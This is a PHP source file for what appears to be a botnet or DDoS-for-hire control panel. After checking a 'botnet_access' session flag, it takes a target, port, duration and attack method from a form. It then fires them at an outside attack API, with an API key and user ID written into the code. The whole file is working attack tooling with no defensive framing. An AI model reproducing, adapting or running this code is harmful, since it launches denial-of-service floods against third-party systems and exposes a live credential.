<?php
    session_start();

    if ($_SESSION['botnet_access'] != 1 || !isset($_SESSION['authkey'])) {
        header('Location: index.php');
        exit;
    }

    require "inc/main_funcs.php";
    require "inc/sql_funcs.php";

    function botnet_api_error($message)
    {
        $_SESSION['error_style'] = 0;
        $_SESSION['error_message'] = $message;
        header('Location: botnet.php');
        exit;
    }

    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        $target = filter_var($_POST['enter_target'], FILTER_SANITIZE_STRING);
        $port = filter_var($_POST['enter_port'], FILTER_VALIDATE_INT);
        $time = filter_var($_POST['enter_time'], FILTER_VALIDATE_INT);
        $method = filter_var($_POST['attackMethod'], FILTER_SANITIZE_STRING);

        // Port and Time validation
        if ($port === false || $port < 1 || $port > 65535) {
            botnet_api_error("Invalid port number (1-65535)");
        }
        if ($time === false || $time < 1 || $time > 120) {
            botnet_api_error("Invalid attack duration (1-120 seconds)");
        }

        // Prepare API request
        $url = "https://api.tsuki.army/v2/start?api_key=tsuki-army-nyaadhhd&user=6643&target=".$target."&time=".$time."&method=".$method."&port=".$port."";

        $api_response = file_get_contents($url);
        if ($api_response === false) {
            botnet_api_error("API Request Failed");
        }

        $api_data = json_decode($api_response, true);
        if ($api_data !== null) {
            echo $api_data;
            exit();
        }
    }
?>
